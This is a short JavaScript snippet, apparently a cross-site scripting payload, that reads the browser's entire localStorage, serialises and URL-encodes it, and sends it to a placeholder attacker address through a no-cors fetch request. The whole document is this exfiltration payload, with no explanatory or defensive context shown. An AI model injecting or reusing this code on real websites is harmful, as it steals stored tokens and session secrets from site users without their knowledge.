var AttackerURL = "http://<ip_addr>";
var LocalSecretsCookie = encodeURIComponent(JSON.stringify(localStorage));
fetch([AttackerURL, "/cookie/", LocalSecretsCookie].join(''), {
	mode: 'no-cors'
});
